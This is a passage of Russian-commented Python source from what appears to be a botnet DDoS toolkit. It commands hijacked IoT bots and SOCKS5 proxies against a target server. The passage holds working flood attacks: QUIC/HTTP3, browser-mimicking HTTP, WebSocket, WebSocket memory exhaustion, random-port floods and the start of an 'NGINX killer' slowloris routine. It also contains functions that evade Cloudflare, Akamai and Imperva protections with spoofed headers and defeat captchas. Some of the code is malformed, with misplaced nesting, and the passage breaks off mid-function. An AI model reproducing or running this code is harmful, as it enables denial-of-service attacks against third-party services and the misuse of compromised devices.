            request_lines.extend(["", ""])
            request = "\r\n".join(request_lines)
            
            sock.send(request.encode())
            
            # Читаем ответ
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()
            
            # Успешный обход если не 403/401
            return '403' not in response and '401' not in response and 'denied' not in response.lower()
            
        except:
            return False

    def http3_quic_flood(self, target_ip, target_port=443, duration=60):
        """HTTP/3 QUIC flood атака - современный протокол, обход традиционных защит"""
        print(f"🌐 Запуск HTTP/3 QUIC Flood атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'quic_connections': 0,
            'http3_requests': 0,
            'failed_connections': 0,
            'successful_handshakes': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def quic_flood_attack(device):
            connections_made = 0
            requests_sent = 0
            failed_connections = 0
            successful_handshakes = 0
            
            try:
                print(f"🌐 {device.ip} начинает HTTP/3 QUIC атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем QUIC соединение
                        quic_connection = self._create_quic_connection(target_ip, target_port)
                        
                        if quic_connection:
                            connections_made += 1
                            attack_stats['quic_connections'] += 1
                            successful_handshakes += 1
                            attack_stats['successful_handshakes'] += 1
                            
                            # Отправляем несколько HTTP/3 запросов в одном соединении
                            for i in range(random.randint(3, 10)):
                                try:
                                    # HTTP/3 запрос через QUIC
                                    request_success = self._send_http3_request(quic_connection, target_ip)
                                    if request_success:
                                        requests_sent += 1
                                        attack_stats['http3_requests'] += 1
                                    
                                    time.sleep(0.1)
                                    
                                except Exception:
                                    break
                            
                            # Закрываем соединение
                            self._close_quic_connection(quic_connection)
                        
                        # Случайная пауза между соединениями
                        time.sleep(random.uniform(0.2, 0.5))
                        
                    except Exception as e:
                        failed_connections += 1
                        attack_stats['failed_connections'] += 1
                        continue
                
                print(f"✅ {device.ip}: {connections_made} QUIC соединений, {requests_sent} HTTP/3 запросов")
                return connections_made, requests_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, quic_flood_attack, "HTTP/3 QUIC Flood")
        
        print(f"\n📊 HTTP/3 QUIC Flood результаты:")
        print(f"   QUIC соединений: {attack_stats['quic_connections']}")
        print(f"   HTTP/3 запросов: {attack_stats['http3_requests']}")
        print(f"   Успешных handshakes: {attack_stats['successful_handshakes']}")
        print(f"   Эффективность: {(attack_stats['successful_handshakes']/attack_stats['quic_connections']*100 if attack_stats['quic_connections'] > 0 else 0):.1f}%")
        
        return results

    def _create_quic_connection(self, target_ip, target_port):
        """Создание QUIC соединения"""
        try:
            # Имитация QUIC handshake через raw sockets
            # В реальности нужно использовать библиотеку like aioquic
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)
            
            # QUIC initial packet simulation
            quic_initial = self._create_quic_initial_packet(target_ip)
            sock.sendto(quic_initial, (target_ip, target_port))
            
            # Ждем ответ (если сервер поддерживает QUIC)
            try:
                response, addr = sock.recvfrom(4096)
                if self._is_quic_response(response):
                    return {
                        'socket': sock,
                        'connected': True,
                        'connection_id': os.urandom(8)
                    }
            except socket.timeout:
                # Сервер не отвечает на QUIC, но это нормально
                pass
                
            sock.close()
            return None
            
        except Exception as e:
            return None

    def _create_quic_initial_packet(self, target_ip):
        """Создание QUIC initial packet"""
        # Базовый QUIC initial packet structure
        packet = b''
        
        # Header: Flags + Connection ID
        flags = 0xc0  # Long header, initial packet
        packet += bytes([flags])
        
        # Version (QUIC v1)
        packet += b'\x00\x00\x00\x01'
        
        # Destination Connection ID length + random CID
        dcil = 8
        packet += bytes([dcil])
        packet += os.urandom(dcil)
        
        # Source Connection ID length + random CID  
        scil = 0  # Zero length for initial
        packet += bytes([scil])
        
        # Token length (0)
        packet += b'\x00'
        
        # Length + Payload (минимум для handshake)
        payload = os.urandom(32)
        packet += len(payload).to_bytes(2, 'big')
        packet += payload
        
        return packet

    def _is_quic_response(self, data):
        """Проверка является ли ответ QUIC пакетом"""
        if len(data) < 5:
            return False
        # Проверяем QUIC signature
        return data[0] & 0x80 != 0  # Long header bit

    def _send_http3_request(self, quic_connection, target_ip):
        """Отправка HTTP/3 запроса через QUIC соединение"""
        try:
            # HTTP/3 frame: HEADERS frame
            headers_frame = self._create_http3_headers_frame(target_ip)
            
            # Отправляем через QUIC stream
            quic_connection['socket'].sendto(headers_frame, (target_ip, 443))
            
            # DATA frame (если нужно)
            data_frame = self._create_http3_data_frame()
            quic_connection['socket'].sendto(data_frame, (target_ip, 443))
            
            return True
            
        except Exception:
            return False

    def _create_http3_headers_frame(self, target_ip):
        """Создание HTTP/3 HEADERS frame"""
        frame = b''
        
        # Frame type: HEADERS (0x01)
        frame += b'\x01'
        
        # Headers payload
        headers = [
            (b':method', b'GET'),
            (b':scheme', b'https'),
            (b':authority', target_ip.encode()),
            (b':path', b'/'),
            (b'user-agent', b'Mozilla/5.0 (compatible)'),
        ]
        
        # QPACK compressed headers simulation
        headers_payload = b''.join(
            len(k).to_bytes(1, 'big') + k + len(v).to_bytes(1, 'big') + v 
            for k, v in headers
        )
        
        frame += len(headers_payload).to_bytes(3, 'big')
        frame += headers_payload
        
        return frame

    def _create_http3_data_frame(self):
        """Создание HTTP/3 DATA frame"""
        frame = b''
        
        # Frame type: DATA (0x00)
        frame += b'\x00'
        
        # Random payload
        payload = os.urandom(random.randint(100, 1000))
        frame += len(payload).to_bytes(3, 'big')
        frame += payload
        
        return frame

    def _close_quic_connection(self, quic_connection):
        """Закрытие QUIC соединения"""
        try:
            if quic_connection and 'socket' in quic_connection:
                quic_connection['socket'].close()
        except:
            pass

        def bypass_waf(self, waf_type, session, target_ip, target_port):
            """Обходит различные WAF системы"""
            try:
                if waf_type == 'cloudflare':
                    return self.bypass_cloudflare(session, target_ip, target_port)
                elif waf_type == 'akamai':
                    return self.bypass_akamai(session)
                elif waf_type == 'imperva':
                    return self.bypass_imperva(session)
                else:
                    return self.bypass_generic_waf(session)
            except Exception as e:
                print(f"❌ Ошибка обхода WAF {waf_type}: {e}")
                return False

        def bypass_cloudflare(self, session, target_ip, target_port):
            """Обход Cloudflare защиты"""
            try:
                # Добавляем заголовки для обхода Cloudflare
                session.headers['X-Forwarded-For'] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                session.headers['X-Real-IP'] = session.headers['X-Forwarded-For']
                session.headers['CF-Connecting-IP'] = session.headers['X-Forwarded-For']
                session.headers['CF-IPCountry'] = random.choice(['US', 'GB', 'DE', 'FR', 'RU'])
                
                # Имитируем поведение реального браузера
                session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                session.headers['Accept-Language'] = 'en-US,en;q=0.5'
                
                print(f"🛡️ Обход Cloudflare для сессии {session.session_id}")
                return True
            except Exception as e:
                print(f"❌ Ошибка обхода Cloudflare: {e}")
                return False

        def bypass_akamai(self, session):
            """Обход Akamai защиты"""
            try:
                # Akamai часто проверяет User-Agent и Accept-Language
                session.headers['User-Agent'] = random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                ])
                session.headers['Accept-Language'] = 'en-US,en;q=0.9'
                session.headers['X-Akamai-Edgescape'] = 'ip=8.8.8.8'
                
                return True
            except Exception as e:
                print(f"❌ Ошибка обхода Akamai: {e}")
                return False

        def bypass_imperva(self, session):
            """Обход Imperva/Incapsula"""
            try:
                # Imperva часто использует JavaScript challenges
                session.headers['X-Requested-With'] = 'XMLHttpRequest'
                session.headers['X-Imperva'] = f"incap_ses_{random.randint(100000000, 999999999)}"
                
                # Добавляем кастомные заголовки
                session.headers['Accept'] = 'application/json, text/javascript, */*; q=0.01'
                
                return True
            except Exception as e:
                print(f"❌ Ошибка обхода Imperva: {e}")
                return False

        def bypass_generic_waf(self, session):
            """Обход generic WAF"""
            try:
                # Общие методы обхода WAF
                session.headers['X-Forwarded-For'] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                session.headers['X-Real-IP'] = session.headers['X-Forwarded-For']
                
                # Меняем порядок заголовков
                session.headers['Accept-Encoding'] = random.choice(['gzip, deflate, br', 'deflate, gzip, br'])
                
                # Добавляем случайные заголовки
                session.headers[f'X-Custom-{random.randint(1000, 9999)}'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                
                return True
            except Exception as e:
                print(f"❌ Ошибка обхода generic WAF: {e}")
                return False

        def solve_simple_captcha(self, image_data=None, text_captcha=None):
            """Решает простые капчи (текстовые и изображения)"""
            try:
                if text_captcha:
                    # Простая текстовая капча - базовые паттерны
                    common_patterns = {
                        '2+2': '4', '3+4': '7', '5+3': '8', '6+2': '8',
                        'one+two': '3', 'three+four': '7', 'five+one': '6'
                    }
                    
                    for pattern, solution in common_patterns.items():
                        if pattern in text_captcha.lower():
                            return solution
                    
                    # Пытаемся извлечь числа и сложить их
                    import re
                    numbers = re.findall(r'\d+', text_captcha)
                    if len(numbers) >= 2:
                        return str(int(numbers[0]) + int(numbers[1]))
                    
                    # Fallback - случайный ответ
                    return ''.join(random.choices('0123456789', k=4))
                
                elif image_data:
                    # Для изображений используем базовое OCR (если доступно)
                    try:
                        import pytesseract
                        from PIL import Image
                        import io
                        
                        image = Image.open(io.BytesIO(image_data))
                        text = pytesseract.image_to_string(image)
                        text = ''.join(filter(str.isalnum, text))
                        
                        if text:
                            return text
                        else:
                            return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))
                    except ImportError:
                        # Fallback если OCR не доступен
                        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))
                
                return ''.join(random.choices('0123456789', k=4))
                
            except Exception as e:
                print(f"❌ Ошибка решения капчи: {e}")
                return ''.join(random.choices('0123456789', k=4))

        def perform_user_actions(self, session, connection, target_ip, target_port, use_https):
            """Выполняет последовательность действий пользователя"""
            actions = []
            
            # 1. Посещение главной страницы
            actions.append(('GET', '/', None))
            
            # 2. Посещение случайных страниц
            pages = ['/about', '/contact', '/products', '/services', '/blog', 
                    '/news', '/faq', '/support', '/api/v1/info', '/sitemap.xml']
            
            for _ in range(random.randint(2, 5)):
                page = random.choice(pages)
                actions.append(('GET', page, None))
                
                # 30% chance для POST запроса
                if random.random() > 0.7:
                    post_data = {
                        'search': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
                        'page': random.randint(1, 10),
                        'sort': random.choice(['newest', 'popular', 'relevant'])
                    }
                    actions.append(('POST', '/search', post_data))
            
            # 3. AJAX запросы (если JS включен)
            if session.js_enabled:
                ajax_endpoints = ['/api/data', '/api/users', '/api/products', 
                                 '/api/statistics', '/api/config']
                for endpoint in random.sample(ajax_endpoints, min(2, len(ajax_endpoints))):
                    actions.append(('GET', endpoint, None))
            
            # Выполняем действия
            for method, path, data in actions:
                try:
                    headers = session.make_request()
                    
                    if method == 'GET':
                        connection.request("GET", path, headers=headers)
                    else:  # POST
                        if data:
                            import json
                            post_data = json.dumps(data)
                            headers['Content-Type'] = 'application/json'
                            headers['Content-Length'] = str(len(post_data))
                            connection.request("POST", path, body=post_data, headers=headers)
                        else:
                            connection.request("POST", path, headers=headers)
                    
                    response = connection.getresponse()
                    response_data = response.read()
                    
                    # Обновляем cookies
                    if 'Set-Cookie' in response.headers:
                        session.add_cookies(response.headers['Set-Cookie'])
                    
                    # Обновляем referer
                    session.referer = f"{'https' if use_https else 'http'}://{target_ip}:{target_port}{path}"
                    
                    attack_stats['total_requests'] += 1
                    attack_stats['successful_responses'] += 1
                    
                    # Проверяем наличие WAF
                    detected_wafs = self.detect_waf(response.headers, response_data)
                    if detected_wafs:
                        print(f"🎯 Обнаружен WAF: {', '.join(detected_wafs)}")
                        for waf in detected_wafs:
                            if self.bypass_waf(waf, session, target_ip, target_port):
                                attack_stats['waf_bypassed'] += 1
                    
                    # Проверяем наличие капчи
                    if any(indicator in str(response_data).lower() for indicator in ['captcha', 'recaptcha', 'hcaptcha']):
                        print(f"🛡️ Обнаружена капча, пытаемся решить...")
                        solution = self.solve_simple_captcha(text_captcha=str(response_data))
                        if solution:
                            attack_stats['captcha_solved'] += 1
                            # Добавляем решение в следующий запрос
                            session.headers['X-Captcha-Solution'] = solution
                    
                    # Случайная задержка между действиями
                    time.sleep(random.uniform(0.5, 2.0))
                    
                except Exception as e:
                    attack_stats['failed_requests'] += 1
                    continue

        def browser_http_attack(device):
            """Основная функция атаки для одного устройства"""
            sessions_created = 0
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"🌐 {bot_type} {device.ip} начинает Advanced Browser HTTP Flood...")
                start_time = time.time()
                
                # Создаем несколько сессий для устройства
                sessions = []
                for i in range(random.randint(1, max_sessions_per_bot)):
                    session = BrowserSession()
                    sessions.append(session)
                    sessions_created += 1
                    attack_stats['sessions_created'] += 1
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    for session in sessions[:]:  # Копируем список для безопасной итерации
                        try:
                            # Создаем соединение
                            if use_https:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                
                                if device.bot_type == "socks5" and self.socks5_available:
                                    # HTTPS через SOCKS5
                                    sock = self._create_socks5_connection(device, target_ip, target_port)
                                    connection = http.client.HTTPSConnection(target_ip, target_port, timeout=15, context=context, sock=sock)
                                else:
                                    # Прямое HTTPS соединение
                                    connection = http.client.HTTPSConnection(target_ip, target_port, timeout=15, context=context)
                            else:
                                if device.bot_type == "socks5" and self.socks5_available:
                                    # HTTP через SOCKS5
                                    sock = self._create_socks5_connection(device, target_ip, target_port)
                                    connection = http.client.HTTPConnection(target_ip, target_port, timeout=15, sock=sock)
                                else:
                                    # Прямое HTTP соединение
                                    connection = http.client.HTTPConnection(target_ip, target_port, timeout=15)
                            
                            # Выполняем последовательность действий пользователя
                            self.perform_user_actions(session, connection, target_ip, target_port, use_https)
                            
                            connection.close()
                            
                            # Обновляем статистику
                            requests_sent += session.request_count
                            bytes_sent += session.request_count * 500  # Примерная оценка
                            
                            # Периодически пересоздаем сессию
                            if session.request_count > random.randint(10, 25) or random.random() > 0.8:
                                sessions.remove(session)
                                new_session = BrowserSession()
                                sessions.append(new_session)
                                sessions_created += 1
                                attack_stats['sessions_created'] += 1
                            
                            # Задержка между сессиями
                            time.sleep(random.uniform(1.0, 3.0))
                            
                        except Exception as e:
                            failed_requests += 1
                            attack_stats['failed_requests'] += 1
                            
                            # Пересоздаем сессию при ошибке
                            if session in sessions:
                                sessions.remove(session)
                                new_session = BrowserSession()
                                sessions.append(new_session)
                                sessions_created += 1
                                attack_stats['sessions_created'] += 1
                            
                            continue
                
                print(f"✅ {bot_type} {device.ip} создал {sessions_created} сессий, "
                      f"отправил {requests_sent} запросов, ошибок: {failed_requests}")
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку
        results = self._run_attack(all_active_bots, attack_stats, browser_http_attack, "Advanced Browser HTTP Flood")

        # Детальная статистика
        print(f"\n📊 ADVANCED BROWSER HTTP FLOOD РЕЗУЛЬТАТЫ:")
        print(f"🌐 Сессий создано: {attack_stats['sessions_created']}")
        print(f"📦 Запросов отправлено: {attack_stats['total_requests']}")
        print(f"✅ Успешных ответов: {attack_stats['successful_responses']}")
        print(f"🛡️ WAF обойдено: {attack_stats['waf_bypassed']}")
        print(f"🧩 Капч решено: {attack_stats['captcha_solved']}")
        print(f"💾 Данных отправлено: {attack_stats['total_bytes'] / 1024 / 1024:.2f} MB")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")
        print(f"⏱️ Время выполнения: {time.time() - attack_stats['start_time']:.2f} секунд")

        return results

    def websocket_flood(self, target_ip, target_port=80, duration=60):
        """WebSocket flood атака для обхода защиты"""
        print(f"🔗 Запуск WebSocket flood атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots
        # ИСПРАВЛЕНИЕ: используем all_active_bots вместо active_devices
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0

        attack_stats = {
            'total_connections': 0,
            'total_bytes': 0,
            'failed_connections': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def websocket_attack(device):
            connections_created = 0
            bytes_sent = 0
            failed_connections = 0
            
            try:
                print(f"🔗 {device.ip} начинает WebSocket атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем WebSocket-like соединение
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((target_ip, target_port))
                        
                        # WebSocket handshake
                        key = base64.b64encode(os.urandom(16)).decode()
                        handshake = (
                            f"GET /chat HTTP/1.1\r\n"
                            f"Host: {target_ip}\r\n"
                            f"Upgrade: websocket\r\n"
                            f"Connection: Upgrade\r\n"
                            f"Sec-WebSocket-Key: {key}\r\n"
                            f"Sec-WebSocket-Version: 13\r\n"
                            f"User-Agent: {random.choice(self.user_agents)}\r\n"
                            f"\r\n"
                        )
                        
                        sock.send(handshake.encode())
                        response = sock.recv(4096)

                        
                        # Отправляем WebSocket данные
                        if b"101 Switching Protocols" in response:
                            for _ in range(random.randint(5, 20)):
                                message = f"message_{random.randint(1000, 9999)}"
                                frame = self._create_websocket_frame(message.encode())
                                sock.send(frame)
                                bytes_sent += len(frame)
                                time.sleep(random.uniform(0.1, 0.5))
                        
                        connections_created += 1
                        bytes_sent += len(handshake)
                        
                        attack_stats['total_connections'] += 1
                        attack_stats['total_bytes'] += bytes_sent
                        
                        sock.close()
                        time.sleep(random.uniform(1, 5))
                        
                    except Exception:
                        failed_connections += 1
                        attack_stats['failed_connections'] += 1
                        continue
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip} создал {connections_created} WebSocket соединений ({mb_sent:.2f} МБ), ошибок: {failed_connections}")
                return connections_created, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # ИСПРАВЛЕНИЕ: используем all_active_bots
        return self._run_attack(all_active_bots, attack_stats, websocket_attack, "WebSocket")

    def _create_websocket_frame(self, data):
        """Создает WebSocket frame"""
        frame = bytearray()
        frame.append(0x81)  # FIN + text frame
        
        if len(data) < 126:
            frame.append(len(data))
        elif len(data) < 65536:
            frame.append(126)
            frame.extend(struct.pack("!H", len(data)))
        else:
            frame.append(127)
            frame.extend(struct.pack("!Q", len(data)))
        
        frame.extend(data)
        return bytes(frame)

    def randomized_port_attack(self, target_ip, duration=60):
        """Атака на случайные порты для обхода защиты"""
        print(f"🎯 Запуск Randomized Port атаки на {target_ip}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots
        # ИСПРАВЛЕНИЕ: используем all_active_bots вместо active_devices
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0

        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def random_port_attack(device):
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            
            try:
                print(f"🎯 {device.ip} начинает Randomized Port атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Случайный порт и протокол
                        target_port = random.randint(1, 65535)
                        use_tcp = random.choice([True, False])
                        
                        if use_tcp:
                            # TCP соединение
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(2)
                            result = sock.connect_ex((target_ip, target_port))
                            if result == 0:
                                sock.send(b"GET / HTTP/1.1\r\n\r\n")
                                time.sleep(0.1)
                            sock.close()
                        else:
                            # UDP пакет
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.settimeout(1)
                            data = os.urandom(random.randint(64, 1024))
                            sock.sendto(data, (target_ip, target_port))
                            sock.close()
                        
                        packets_sent += 1
                        bytes_sent += len(data) if not use_tcp else 100
                        
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += bytes_sent
                        
                        time.sleep(random.uniform(0.01, 0.1))
                        
                    except Exception:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip} отправил {packets_sent} пакетов ({mb_sent:.2f} МБ), ошибок: {failed_packets}")
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # ИСПРАВЛЕНИЕ: используем all_active_bots
        return self._run_attack(all_active_bots, attack_stats, random_port_attack, "Randomized Port")

    def websocket_memory_exhaustion_attack(self, target_ip, target_port=443, use_https=True, duration=60):
        """WebSocket Memory Exhaustion атака - создает множество WebSocket соединений с большими данными"""
        print(f"🕸️ Запуск WebSocket Memory Exhaustion атаки на {target_ip}:{target_port}")
        
        try:
            import websocket
            from websocket import create_connection, WebSocket
        except ImportError:
            print("❌ Библиотека websocket-client не установлена. Установите: pip install websocket-client")
            return 0

        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_connections': 0,
            'active_connections': 0,
            'total_messages': 0,
            'total_data_sent': 0,
            'failed_connections': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_large_websocket_message(size_kb=100):
            """Создает большое сообщение для WebSocket"""
            # Различные типы данных для разнообразия
            message_types = [
                # JSON данные
                lambda: json.dumps({"data": "A" * (size_kb * 1024 - 50), "timestamp": time.time()}),
                # Текстовые данные
                lambda: "X" * (size_kb * 1024),
                # Base64 encoded данные
                lambda: base64.b64encode(os.urandom(size_kb * 768)).decode('ascii'),  # ~size_kb KB
                # Числовые данные массива
                lambda: json.dumps({"array": [random.randint(1, 1000000) for _ in range(size_kb * 10)]})
            ]
            return random.choice(message_types)()

        def websocket_attack_single(device):
            connections_created = 0
            messages_sent = 0
            data_sent = 0
            failed_connections = 0
            active_ws_connections = []

            try:
                print(f"🕸️ {device.ip} начинает WebSocket Memory Exhaustion атаку...")
                start_time = time.time()

                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Определяем протокол
                        protocol = "wss" if use_https else "ws"
                        url = f"{protocol}://{target_ip}:{target_port}/ws"
                        
                        # Дополнительные заголовки для обхода защиты
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Origin': f'http{"s" if use_https else ""}://{target_ip}',
                            'Sec-WebSocket-Version': '13',
                            'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits',
                        }

                        # Для SOCKS5 прокси
                        if device.bot_type == "socks5" and self.socks5_available:
                            try:
                                # Создаем соединение через SOCKS5
                                sock = socks.socksocket()
                                if device.username and device.password:
                                    sock.set_proxy(socks.SOCKS5, device.ip, device.port,
                                                username=device.username, password=device.password)
                                else:
                                    sock.set_proxy(socks.SOCKS5, device.ip, device.port)
                                sock.settimeout(15)
                                sock.connect((target_ip, target_port))
                                
                                # Обертываем в SSL если нужно
                                if use_https:
                                    context = ssl.create_default_context()
                                    context.check_hostname = False
                                    context.verify_mode = ssl.CERT_NONE
                                    sock = context.wrap_socket(sock, server_hostname=target_ip)
                                
                                # Создаем WebSocket соединение
                                ws = websocket.create_connection(url, socket=sock, header=headers, timeout=15)
                            except Exception as e:
                                print(f"❌ SOCKS5 WebSocket ошибка: {e}")
                                continue
                        else:
                            # Прямое WebSocket соединение для IoT устройств
                            ws = websocket.create_connection(url, header=headers, timeout=15)

                        connections_created += 1
                        attack_stats['total_connections'] += 1
                        attack_stats['active_connections'] += 1
                        active_ws_connections.append(ws)

                        print(f"✅ {device.ip} установил WebSocket соединение #{connections_created}")

                        # Отправляем сообщения через это соединение
                        messages_per_connection = random.randint(10, 50)
                        for i in range(messages_per_connection):
                            if not attack_stats['is_running']:
                                break

                            try:
                                # Создаем большое сообщение (10-500 KB)
                                message_size = random.randint(10, 500)
                                message = create_large_websocket_message(message_size)
                                
                                # Отправляем сообщение
                                ws.send(message)
                                
                                messages_sent += 1
                                data_sent += len(message)
                                
                                attack_stats['total_messages'] += 1
                                attack_stats['total_data_sent'] += len(message)

                                # Читаем ответ (если есть)
                                try:
                                    ws.settimeout(2)
                                    response = ws.recv()
                                    # Игнорируем ответ, просто читаем чтобы очистить буфер
                                except:
                                    pass

                                # Случайная задержка между сообщениями
                                time.sleep(random.uniform(0.1, 0.5))

                            except Exception as e:
                                # Продолжаем с следующим сообщением
                                continue

                        # Держим соединение открытым некоторое время
                        keep_alive_time = random.randint(5, 30)
                        keep_alive_start = time.time()
                        
                        while attack_stats['is_running'] and (time.time() - keep_alive_start) < keep_alive_time:
                            try:
                                # Периодически отправляем ping/pong
                                if random.random() > 0.8:
                                    ws.ping()
                                time.sleep(1)
                            except:
                                break

                    except Exception as e:
                        failed_connections += 1
                        attack_stats['failed_connections'] += 1
                        print(f"❌ Ошибка WebSocket соединения: {e}")
                        continue

                # Закрываем все соединения
                for ws in active_ws_connections:
                    try:
                        ws.close()
                        attack_stats['active_connections'] -= 1
                    except:
                        pass

                mb_sent = data_sent / 1024 / 1024
                print(f"✅ {device.ip} создал {connections_created} WebSocket соединений")
                print(f"   📤 Отправил {messages_sent} сообщений ({mb_sent:.2f} МБ)")
                print(f"   ❌ Ошибок: {failed_connections}")

                return connections_created, data_sent

            except Exception as e:
                print(f"❌ Критическая ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку
        results = self._run_attack(
            all_active_bots, 
            attack_stats, 
            websocket_attack_single, 
            "WebSocket Memory Exhaustion",
            max_workers=min(len(all_active_bots), 5000000000)  # Ограничиваем для избежания перегрузки
        )

        # Статистика атаки
        total_time = time.time() - attack_stats['start_time']
        connections_per_second = attack_stats['total_connections'] / max(total_time, 1)
        data_per_second = attack_stats['total_data_sent'] / max(total_time, 1024*1024)  # MB/s

        print(f"\n🎯 WebSocket Memory Exhaustion РЕЗУЛЬТАТЫ:")
        print(f"🔗 Всего соединений: {attack_stats['total_connections']}")
        print(f"📨 Всего сообщений: {attack_stats['total_messages']}")
        print(f"💾 Всего данных: {attack_stats['total_data_sent'] / 1024 / 1024:.2f} MB")
        print(f"⚡ Скорость: {connections_per_second:.1f} соединений/сек, {data_per_second:.2f} MB/сек")
        print(f"❌ Ошибок соединений: {attack_stats['failed_connections']}")
        print(f"⏱️ Общее время: {total_time:.2f} секунд")

        return attack_stats['total_connections']

    def nginx_killer_attack(self, target_ip, target_port=80, use_https=False, duration=60):
        """
        Специализированная атака для уничтожения Nginx серверов
        Использует уязвимости и особенности Nginx:
        - Slowloris атака на ограничение соединений
        - HTTP pipelining для обхода буферов
        - Большие заголовки для переполнения буферов
        - Множественные Location header для сбоя обработки
        """
        print(f"🎯 Запуск NGINX KILLER атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_requests': 0,
            'total_connections': 0,
            'slowloris_connections': 0,
            'pipelining_requests': 0,
            'buffer_overflow_attempts': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_nginx_slowloris_connection(target_ip, target_port, use_https=False):
            """Создает медленное соединение для атаки на worker_connections"""
            try:
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(30)
                    conn = context.wrap_socket(sock, server_hostname=target_ip)
                    conn.connect((target_ip, target_port))
                else:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    conn.settimeout(30)
                    conn.connect((target_ip, target_port))

